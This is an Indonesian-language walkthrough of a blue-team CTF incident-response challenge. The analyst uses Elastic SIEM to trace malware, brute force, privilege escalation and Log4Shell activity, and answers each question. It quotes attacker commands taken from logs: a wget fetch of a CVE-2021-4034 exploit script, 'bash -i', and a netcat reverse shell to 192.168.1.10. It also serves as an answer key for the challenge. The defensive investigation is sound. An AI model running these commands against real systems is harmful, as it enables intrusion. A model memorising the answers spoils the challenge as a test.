# Elastic-case-Incident-Response-Cyberdefenders
Berikut adalah writeup yang saya tulis mengenai Elastic Case - Incident Response yang berasal dari platform CyberDefender.org.

![image](https://user-images.githubusercontent.com/43168046/182867474-4b34cd4e-e5f4-4874-a0fa-35a384d5d4f1.png)

## Source Link 
https://cyberdefenders.org/blueteam-ctf-challenges/90

## Skenario challenge : 
Seorang penyerang dapat mengelabui seorang karyawan agar mengunduh file yang mencurigakan dan menjalankannya. Penyerang mengkompromikan sistem, bersama dengan itu, Tim Keamanan tidak memperbarui sebagian besar sistem. Penyerang dapat berporos ke sistem lain dan membahayakan perusahaan. Sebagai analis SOC, Anda ditugaskan untuk menyelidiki insiden tersebut menggunakan Elastic sebagai alat SIEM dan membantu tim untuk mengusir penyerang.

## Tools yang digunakan
- Virtual Box
- Elastic

## Challenge
### 1. Who downloads the malicious file which has a double extension ?
Langkah pertama yang harus dilakukan adalah dengan masuk kedalam menu Security dan pilih menu alert.

![image](https://user-images.githubusercontent.com/43168046/182867933-a27eb657-05e6-4ab4-ab8d-5b4d852a3795.png)

Pada menu alert, akan terlihat data pada rentang waktu tertentu. Disii saya menyetel waktu pertanggal 8 januari sampai dengan 12 Februari. Untuk mempermudah menemukan data yang diinginkan, terdapat bebera filer yang dapat digunakan. Dikarenakan kita focus pada malware, maka saya akan menggunakan filter “File Name Type”, dan fokus saya pada Acount_details.pdf.exe.  Filter tersebut juga diikutin dengan filter kedua yaitu “Event.Action” dan fokus saya pada “Creation”.

![image](https://user-images.githubusercontent.com/43168046/182868242-f06cafe8-a366-4959-8aa2-da521942bbae.png)

Berdasarkan kedua filter tersebut, terdapat 5 data berhasil kami temukan. Dengan rincian 2 username yang kami dapatkan yaitu “cybery” dan “ahmed”. Tentu saja kami Kembali menyelidiki data tersebut berdasarkan rentang waktu. Dimana kami melihat username “ahmed” menjadi yang pertama kali. Sehingga kami pun membuka table dari data username "ahmed".

![image](https://user-images.githubusercontent.com/43168046/182868310-7e73b930-940d-43d4-a823-9804c61de199.png)

Melihat data pada table tersebut. Terlihat bahwa user ahmed melakukan proses download file \Acount_details.pdf.exe menggunakan browser microsoft edge. Berdasarkan data tersebut, kami menyimpulkan bahwa username “ahmed” telah melakukan proses downloading pertama dan menyebarkan nya ke yang lain.

### 2. What is the hostname he was using?
Berdasarkan data yang saya temukan sebelumnya, diketahui bahwa username “ahmed” yang telah melakukan proses downloading file terindikasi malware. Melalui table pada elastic, dengan keyword “host.hostname” kami mendapati data hostname yaitu “DESKTOP-Q1SL9P2”.

![image](https://user-images.githubusercontent.com/43168046/182873696-be99d247-0f85-4184-bc1c-a5c4c21ceef5.png)

### 3. What is the name of the malicious file?
Pada data table di elastic alert. Kami juga mendapati data nam filenya dengan menggunakan keyword ”file.name”. Dimana nama file tersebut adalah “Acount_details .pdf.exe”.

![image](https://user-images.githubusercontent.com/43168046/182873922-a4e7f56b-c2ce-47f1-b5db-08f184ca11e9.png)

Terlihat dari data diatas, file yang didownload oleh username “ahmad” yaitu “Acount_details.pdf.exe”. Selain itu file tersebut terbaca oleh elastic memiliki 2 ekstensi file yaitu pdf dan exe. Terlampir juga hash 256 nya yaitu “3e7295a9c21d288772ba3780a648af75 15e6c728e7d4b783deb24e86e9d46 79a”

## 4. What is the attacker's IP address ?
Diketahui bahwa username “ahmed” Memiliki ip address “192.168.10.10”. untuk mengetahui ip address dari attacker, saya menggunakan fitur Analyze yang terlihat pada gambar dibawah. 

![image](https://user-images.githubusercontent.com/43168046/182874121-e6ace6b9-a0f7-449f-a4af-294ea9bb5e40.png)

Terlihat pada data dibawah, terdapat 11 network pada file “Acount_details.pdf.exe”. Setelah kami membukanya, kami mendapati ip destination lainnya, yang kami curigai sebagai ip attacker yaitu “192.168.1.10”. 

![image](https://user-images.githubusercontent.com/43168046/182874207-bd002cb6-4cd4-417a-8417-bac9aed74af9.png)

## 5. Another user with high privilege runs the same malicious file. What is the username?
Berdasarkan pada penggunaan filter “File Name Type”, dan fokus saya pada Acount_details.pdf.exe.  Filter tersebut juga diikutin dengan filter kedua yaitu “Event.Action” dan fokus saya pada “Creation”.  Kami mendapat username lainnya yang terlihat mencoba mengakses file malicious tersebut, yaitu “cybery”.

![image](https://user-images.githubusercontent.com/43168046/182874383-6fce03c0-d3af-4a98-8dfa-a5a8af279ba6.png)

## 6.	The attacker was able to upload a DLL file of size 8704. What is the file name?
Kembali kami menggunakan filter “File Name Type”  dan ditambah dengan column “file.size” untuk mengetahui size dari file tersebut. Berdasarkan data yang kami dapatkan, file berketensi .dll yang berukuran 8704 adalah “mCblHDgWP.dll”.

![image](https://user-images.githubusercontent.com/43168046/183102228-aa015636-00d5-45fb-8db3-f9fe610892ae.png)

Terlihat pada data dibawah, terdapat 11 network pada file “Acount_details.pdf.exe”. Setelah kami membukanya, kami mendapati ip destination lainnya, yang kami curigai sebagai ip attacker yaitu “192.168.1.10”. 

## 7.	What parent process name spawns cmd with NT AUTHORITY privilege and pid 10716?
Pada filter, kami mencoba menerapkan “Proces.name” dan fokus pada “cmd”. Selain itu pada data, kami menambahkan column “Process.parent.name” serta “process.pid”.  lalu kami mendapatkan bahwa “parent process name” yang dimaksudkan adalah  “rundll32.exe”.

![image](https://user-images.githubusercontent.com/43168046/183102351-ef6cf18e-2b53-4668-9b7a-24d0563600ef.png)

## 8.	The previous process was able to access a registry. What is the full path of the registry?
Telah kita ketahui, bahwa process yang sebelumnya kita selidiki adalah process “rundll32.exe” sehingga menjadi checkpoint kita. Untuk mengetahui registry apa yang telah diakses, kita dapat menggunakan bantuan analyze box.

![image](https://user-images.githubusercontent.com/43168046/183102532-da8e5511-62d1-45e2-b521-073c8661fc31.png)

Diketahui bahwa pada process “rundll32.exe”, terdapat action mengakses registry “ HKLM\SYSTEM\ControlSet001\Control\Lsa\FipsAlgorithmPolicy\Enabled” 

## 9.	PowerShell process with pid 8836 changed a file in the system. What was that filename?
Melalui fitur Analyze Box, kami mencoba menelusuri process “powershell.exe”. terlihat bahwa pada gambar process “powershell.exe”  memiliki process.pid yaitu 8836, dan terlihat bawah adanya indikasi file.change pada path “C:\Windows\system32\config\systemprofile \AppData\Local\Microsoft\Windows\PowerShell\ModuleAnalysisCache”

![image](https://user-images.githubusercontent.com/43168046/183102690-6adea38a-58d1-4217-bec8-9c9c9b9f25c1.png)

## 10.	PowerShell process with pid 11676 created files with the ps1 extension. What is the first file that has been created?
Kami Kembali mencari process “powershell.exe” yang memiliki process.pid yaitu 11676 melalui analyze box. Kami pun menemukannya sepeti pada gambar di bawah.

![image](https://user-images.githubusercontent.com/43168046/183102800-5720b1d2-60b9-4a1f-b777-f9ebde05c1a9.png)

Terlihat bahwa pada gambar diatas, file berkektensi ps1 pertama kali dibuat terjadi pada jam 00:08:46:153 dengan nama file “__PSScriptPolicyTest_bymwxuft.3b5.ps1”

## 11.	What is the machine's IP address that is in the same LAN as a windows machine?
Perlu diingat bahwa windows machine yaitu dengan hostname “DESKTOP-Q1SL9P2” menggunakan ip address “192.168.10.10”. Untuk mengetahui ip addres mana yang sama dengan windows machine tersebut, kita dapat menggunakan menu Eksplore dan masuk ke Host.

![image](https://user-images.githubusercontent.com/43168046/183102937-489bb5cf-566a-4e75-a551-354888ff7759.png)

Terlihat bahwa jumlah host yang berhasil kami temukan sebanyak 5. Setelah kami mengecek satu persatu ,kami menemukan bahwa hostname “Ubuntu” menggunakan ip address yang sama denhgan hostname“DESKTOP-Q1SL9P2” dimana ip address tersebut adalah “192.168.10.30”.

![image](https://user-images.githubusercontent.com/43168046/183102989-5560fa28-f82c-4e26-a89b-2ccf7e0f7cb9.png)

## 12.	The attacker login to the Ubuntu machine after a brute force attack. What is the username he was successfully login with?
Pada ubuntu machine, terindikasi adanya upata brute force. Hal ini dibuktikan dengan tingginya data traffic User authentications Failed  sebanyak 520 kali.

![image](https://user-images.githubusercontent.com/43168046/183103060-f6ccef5f-05ec-4141-86b0-b78ce60edfa8.png)

Diketahui ada 13 jenis user yang terbaca melakukan upaya login pada ubuntu machine, dan username yang terlihat behasil login adalah “salem”.

![image](https://user-images.githubusercontent.com/43168046/183103142-2f9d1db2-f974-4de4-9a7b-6f16bbcd89a4.png)

## 13.	After that attacker downloaded the exploit from the GitHub repo using wget. What is the full URL of the repo?
Setelah mengetahui username attacker, kita Kembali lagi pada menu “Detect”, dan masuk ke “Alert”. Kami menggunakan filter yaitu “User.name”. 

![image](https://user-images.githubusercontent.com/43168046/183103230-0872f79f-d56c-4a48-8619-0bf4ba679fd6.png)

Kami pun langsung masuk ke menu analyze box pada data terakhir, dan benar saja kami menemukan process “wget” seperti pada gambar. 

![image](https://user-images.githubusercontent.com/43168046/183103316-e1f26658-594b-4cd9-9a3b-1523c7f46aca.png)

Terlihat pada gambar, bahwa username “salem” mencoba melakukan prosess download file menggunakan perintah "wget", dan file yang didownload adalah “https://raw. githubusercontent.com/joeammond/CVE-2021-4034/main/CVE-2021-4034.py”

## 14.	After The attacker runs the exploit, which spawns a new process called pkexec, what is the process's md5 hash?
Masih menggunakan analyze box, kami langsung mencari process “pkexec” dimana proses ini memiliki nilai process.pid yaitu 3003 dan user.name yaitu “root”. Berikut adalah md5 hashnya “3a4ad518e9e404a6bad3d39dfebaf2f6”.

![image](https://user-images.githubusercontent.com/43168046/183103455-194a6a76-4ceb-4a97-9589-ef9bab291ba0.png)

## 15.	Then attacker gets an interactive shell by running a specific command on the process id 3011 with the root user. What is the command?
Untuk menjawa pertanyaan ini, kita dapat berfokus pada process id. Dimana process id yang diketahui adalah 3011. Kami pun menelusuri lebih jauh, dan menemukan seperti pada gambar. dan comman tersebut adalah bash -i

![image](https://user-images.githubusercontent.com/43168046/183103534-bd3e1845-a773-4fa4-a6c6-806630ebe954.png)

## 16.	What is the hostname which alert signal.rule.name: "Netcat Network Activity"?
Kami menggunakan filter yaitu signal.rule.name dan kami atur yaitu “Netcat Network Activity”. Diketahui bahwa data tersebut hanya ada satu dan sedang menjalankan process name nc dengan hostname CentOS.

![image](https://user-images.githubusercontent.com/43168046/183103619-be22afa3-587e-42db-868a-6169a51195d1.png)

## 17.	What is the username who ran netcat?
Lagi, berdasarkan pencarian sebelumnya selain mendapatkan data hostname, kami juga mendapatkan data username yang sedangan menjalankan netcat yaitu solr.

![image](https://user-images.githubusercontent.com/43168046/183103695-695cd80d-e15b-410a-ad86-94bc07729c1b.png)

## 18.	What is the parent process name of netcat?
Kami Kembali menelurusi lebih detail menggunakan analyze event menu. Disini kami menemukan bahwa parent process name of netcat adalah java.

![image](https://user-images.githubusercontent.com/43168046/183103751-cddbc854-3a40-4093-bb35-793de99e7a72.png)

## 19.	If you focus on nc process, you can get the entire command that the attacker ran to get a reverse shell. Write the full command?
disini kami mencoba mencari informasi berdasarakan traffic. kami pun masuk analytics dan discover. lalu berdasarkan pertanyaan sebelumnya kami menggunakan filter "host.name : "CentOS" and user.name : solr". kami pun menemukan 3 traffic data yang sesuai dengan filter kami. akhirnya kami menemukan command yang dimaksud. yaitu "	
nc -e /bin/bash 192.168.1.10 9999"

![image](https://user-images.githubusercontent.com/43168046/183109658-0e03088a-f745-41e7-b018-655bec004a07.png)

## 20.	From the previous three questions, you may remember a famous java vulnerability. What is it?
Berdasarkan informasi terbaru, java vulenerability yang terkenal tersebut adalah apache log4j library yaitu log4shell 

## 21 . What is the entire log file path of the "solr" application?











